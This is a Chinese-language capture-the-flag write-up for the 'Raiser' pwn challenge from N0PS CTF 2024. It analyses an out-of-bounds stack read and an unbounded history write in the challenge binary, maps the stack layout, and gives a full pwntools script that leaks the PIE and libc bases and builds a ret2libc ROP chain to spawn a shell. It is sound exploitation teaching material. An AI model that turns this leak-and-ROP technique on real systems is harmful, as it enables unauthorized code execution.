# Raiser

## 题目简述

赛事仓库中的 `pwn/raiser` 只有 `.gitkeep`，没有官方二进制、源码或 WP。为避免凭空补写，本篇使用两个固定提交中的公开材料交叉验证：

- [包含 `raiser_patched`、配套 loader/libc 和求解脚本的公开归档](https://github.com/miraicantsleep/ctf-writeups/tree/01c9c8b07cc3368eff65cfe570f282f98e0d6693/N0PS%20CTF%202024/Raiser)
- [另一名参赛者保存的完整利用脚本](https://github.com/me1sr/CTF-writeups/blob/a8adf03de6c88a866e4ee1495cfc8c4472f823ee/N0PS-2024/raiser/exploit.py)

本地分析所用 `raiser_patched` 大小为 24,601 字节，SHA-256 为：

```text
b813d1ad3d0720fc5534c3af2a804e667a37074cc9da3e8aa46dc4129a960683
```

其保护为 amd64、Partial RELRO、无栈 Canary、NX 开启、PIE 开启，且 RUNPATH 指向当前目录。

## 解题过程

### 识别历史数组的越界读写

主循环反编译后可整理为：

```c
unsigned long long history[16];
unsigned long long count = 0;
memset(history, 0, 0x80);

while (1) {
    base = read_number("base");
    power = read_number("power");

    if (power > 0x1000)
        break;

    if (base == 1337) {
        puts("You found the hidden History feature!");
        printf("%llu\n", history[power]);
        continue;
    }

    result = base;
    for (i = 1; i < power; i++)
        result *= base;

    printf("%llu\n", result);
    history[count++] = result;
}
```

漏洞有两部分：

1. `base == 1337` 时，`power` 被直接当作数组索引；虽然上限为 4096，但数组只有 16 项，形成大范围栈越界读。
2. 普通计算分支持续递增 `count`，却不检查 `count < 16`，形成顺序栈溢出。

令 `power = 1` 时结果恰好等于 `base`，因此普通分支允许把任意 64 位数依次写入栈。

### 确认栈布局并泄露地址

`history` 位于 `rbp - 0x90`。每项 8 字节，因此：

| 索引 | 相对位置 | 用途 |
| ---: | --- | --- |
| 0 至 15 | `rbp-0x90` 至 `rbp-0x18` | 合法历史数组 |
| 16 至 17 | `rbp-0x10`、`rbp-0x08` | 填充 |
| 18 | `rbp` | 保存的 RBP |
| 19 | `rbp+0x08` | 保存的返回地址 |

公开 exploit 还确认：

- `history[19] - 0x28150` 是配套 libc 基址；
- `history[21] - main` 是 PIE 基址。

先读取它们即可绕过 PIE 与 ASLR。真正构造 ROP 前，再执行 19 次 `base=<任意值>, power=1`，正好填满索引 0 到 18；后续三个值将从保存的返回地址开始形成 ROP 链。

### 写入 ret2libc 链

以下脚本保留了公开 exploit 中与配套 libc 一致的偏移。`0x54e32` 是该 libc 内部 `do_system` 路径的入口，公开利用选择它而不是普通包装符号：

```python
from pwn import ELF, context, process


context.arch = "amd64"
exe = context.binary = ELF("./raiser_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
io = process(exe.path)


def submit(base: int, power: int) -> None:
    io.sendlineafter(b"base:\n> ", str(base).encode())
    io.sendlineafter(b"power:\n> ", str(power).encode())


def leak_history(index: int) -> int:
    submit(1337, index)
    io.recvuntil(b"You found the hidden History feature!\n")
    return int(io.recvline().strip())


pie_leak = leak_history(21)
exe.address = pie_leak - exe.sym["main"]

libc_leak = leak_history(19)
libc.address = libc_leak - 0x28150

print(f"PIE  = {exe.address:#x}")
print(f"libc = {libc.address:#x}")

# history[0..18]：填充数组、对齐空间和 saved RBP。
for _ in range(19):
    submit(0xDEADBEEF, 1)

pop_rdi_ret = libc.address + 0x28795
bin_sh = next(libc.search(b"/bin/sh\x00"))
do_system_aligned = libc.address + 0x54E32

# history[19..21]：saved RIP、pop rdi 的参数、下一返回地址。
submit(pop_rdi_ret, 1)
submit(bin_sh, 1)
submit(do_system_aligned, 1)

# 大于 0x1000，退出循环并执行函数尾声中的 ret。
submit(1, 895642315)
io.interactive()
```

控制流变为：

```text
ret -> pop rdi ; ret -> "/bin/sh" -> do_system
```

公开脚本的终点是交互 shell。现有公开材料没有保存比赛环境中的最终 flag 字符串，因此本篇不虚构 flag，只记录已经能够由二进制和两个独立 exploit 共同支持的完整利用机制。

## 方法总结

- 核心技巧：用隐藏 history 功能完成栈越界读，泄露 PIE/libc；再利用无界历史写入和 `power=1` 构造精确的 ret2libc 链。
- 识别信号：固定长度栈数组同时存在用户控制索引和无界计数器，二进制无 Canary 且 NX/PIE 开启。
- 复用要点：先用栈偏移证明泄露索引和覆盖索引，再构造 ROP；不要只照抄硬编码偏移。这里的 libc 偏移仅适用于公开归档中的配套版本，换环境时必须重新泄露并按目标 libc 解析 gadget。
